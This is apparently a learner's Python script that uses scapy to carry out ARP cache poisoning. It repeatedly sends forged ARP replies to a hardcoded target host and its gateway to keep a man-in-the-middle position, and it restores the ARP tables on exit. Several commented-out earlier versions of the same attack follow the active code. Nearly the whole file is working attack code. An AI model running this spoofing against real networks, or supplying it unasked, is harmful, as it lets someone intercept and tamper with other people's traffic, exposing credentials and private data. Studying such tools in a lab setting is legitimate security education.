#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # srp stands for send and receive the p just means you specify the Ether(dst mac)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # this will arpSpoof 192.168.1.148 arp cache and make it seem like the router is @ kali mac address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # show commands to test the code for scapy
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.1.148"
gateway_ip = "192.168.1.1"

try:
    sent_packets_count = 0
    while True:
        # if I don't while loop this then it will only do the ARP spoof once
        # we need to have it do it every few seconds to maintain the MiTM
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # for python3 use print("\r[+] Packets sent: {}".format(sent_packets_count), end="" "
        # comma after print means store all the print statement
        print("\r[+] Packets sent: {}".format(sent_packets_count)),
        # in a buffer and display them in the stdout once the program ends
        sys.stdout.flush()  # makes everything print while its executing and not store it in the buffer
        # you need to use the "\r" in the print command to make it print from the start of the line each time
        time.sleep(2)  # This is will wait 2 seconds before sending another spoof packet.
except KeyboardInterrupt:
    print("\r[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait\n.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
#
# ----------------------------------------------------------------------------------------------------------------------
# added error handling to the program
#
# #!/usr/bin/env python
#
# import scapy.all as scapy
# import time
# import sys
#
# def get_mac(ip):
#     arp_request = scapy.ARP(pdst=ip)
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     arp_request_broadcast = broadcast/arp_request
#     # srp stands for send and receive the p just means you specify the Ether(dst mac)
#     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#
#     return answered_list[0][1].hwsrc
#
#
# def spoof(target_ip, spoof_ip):
#     target_mac = get_mac(target_ip)
#     # this will arpSpoof 192.168.1.148 arp cache and make it seem like the router is @ kali mac address
#     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
#     # show commands to test the code for scapy
#     # print(packet.show())
#     # print(packet.summary())
#     scapy.send(packet, verbose=False)
#
#
# try:
#     sent_packets_count = 0
#     while True:
#         # if I don't while loop this then it will only do the ARP spoof once
#         # we need to have it do it every few seconds to maintain the MiTM
#         spoof("192.168.1.148", "192.168.1.1")
#         spoof("192.168.1.1", "192.168.1.148")
#         sent_packets_count += 2
#         # for python3 use print("\r[+] Packets sent: {}".format(sent_packets_count), end="" "
#         # comma after print means store all the print statement
#         print("\r[+] Packets sent: {}".format(sent_packets_count)),
#         # in a buffer and display them in the stdout once the program ends
#         sys.stdout.flush() # makes everything print while its executing and not store it in the buffer
#         # you need to use the "\r" in the print command to make it print from the start of the line each time
#         time.sleep(2)  # This is will wait 2 seconds before sending another spoof packet.
# except KeyboardInterrupt:
#     print("\r[+] Detected CTRL + C ..... Quitting.")
#
# ----------------------------------------------------------------------------------------------------------------------
# #!/usr/bin/env python
#
# import scapy.all as scapy
# import time
# import sys
#
# def get_mac(ip):
#     arp_request = scapy.ARP(pdst=ip)
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     arp_request_broadcast = broadcast/arp_request
#     # srp stands for send and receive the p just means you specify the Ether(dst mac)
#     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#
#     return answered_list[0][1].hwsrc
#
#
# def spoof(target_ip, spoof_ip):
#     target_mac = get_mac(target_ip)
#     # this will arpSpoof 192.168.1.148 arp cache and make it seem like the router is @ kali mac address
#     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
#     # show commands to test the code for scapy
#     # print(packet.show())
#     # print(packet.summary())
#     scapy.send(packet, verbose=False)
#
#
# while True:
#     sent_packets_count = 0
#     # if I don't while loop this then it will only do the ARP spoof once
#     # we need to have it do it every few seconds to maintain the MiTM
#     spoof("192.168.1.148", "192.168.1.1")
#     spoof("192.168.1.1", "192.168.1.148")
#     sent_packets_count += 2
#     # for python3 use print("\r[+] Packets sent: {}".format(sent_packets_count), end="" "
#     # comma after print means store all the print statement
#     print("\r[+] Packets sent: {}".format(sent_packets_count)),
#     # in a buffer and display them in the stdout once the program ends
#     sys.stdout.flush() # makes everything print while its executing and not store it in the buffer
#     # you need to use the "\r" in the print command to make it print from the start of the line each time
#     time.sleep(2)  # This is will wait 2 seconds before sending another spoof packet.
#

# ----------------------------------------------------------------------------------------------------------------------
# #!/usr/bin/env python
#
# import scapy.all as scapy
# import time
#
#
# def get_mac(ip):
#     arp_request = scapy.ARP(pdst=ip)
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     arp_request_broadcast = broadcast/arp_request
#     # srp stands for send and receive the p just means you specify the Ether(dst mac)
#     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#
#     return answered_list[0][1].hwsrc
#
#
# def spoof(target_ip, spoof_ip):
#     target_mac = get_mac(target_ip)
#     # this will arpSpoof 192.168.1.148 arp cache and make it seem like the router is @ kali mac address
#     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
#     # show commands to test the code for scapy
#     # print(packet.show())
#     # print(packet.summary())
#     scapy.send(packet)
#
#
# while True:
#     # if I don't while loop this then it will only do the ARP spoof once
#     # we need to have it do it every few seconds to maintain the MiTM
#     spoof("192.168.1.148", "192.168.1.1")
#     spoof("192.168.1.1", "192.168.1.148")
#     time.sleep(2)  # This is will wait 2 seconds before sending another spoof packet.
# ----------------------------------------------------------------------------------------------------------------------
# #!/usr/bin/env python
#
# import scapy.all as scapy
#
# # this will arpSpoof 192.168.1.148 arp cache and make it seem like the router is @ kali mac address
# packet = scapy.ARP(op=2,pdst="192.168.1.148",hwdst="90:e1:7b:a3:0b:65",psrc="192.168.1.1")
# # show commands to test the code for scapy
# # print(packet.show())
# # print(packet.summary())
# scapy.send(packet)
